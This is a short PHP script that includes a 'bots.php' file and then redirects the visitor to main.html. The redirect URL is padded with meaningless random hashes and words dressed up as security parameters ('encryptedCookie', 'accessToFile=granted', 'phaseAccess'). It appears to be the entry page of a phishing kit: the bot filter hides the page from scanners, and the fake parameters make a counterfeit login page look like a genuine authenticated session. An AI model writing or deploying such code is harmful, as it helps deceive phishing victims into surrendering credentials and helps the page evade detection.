<?php
	include("bots.php");
	$cookie = md5(rand());
	$fileAccess = rand(000000,99999);
	$accessFile = Array("true","granted","accessing","valid","validating");
	$accessFiles = $accessFile[array_rand($accessFile)];
	
	header("Location: main.html?accessToFile=".$accessFiles."&fileAccess=".$fileAccess."&encryptedCookie=".$cookie."&u=".md5(rand())."&connecting=".md5(rand())."&phaseAccess=".md5(rand())."&p=".md5(rand()));

?>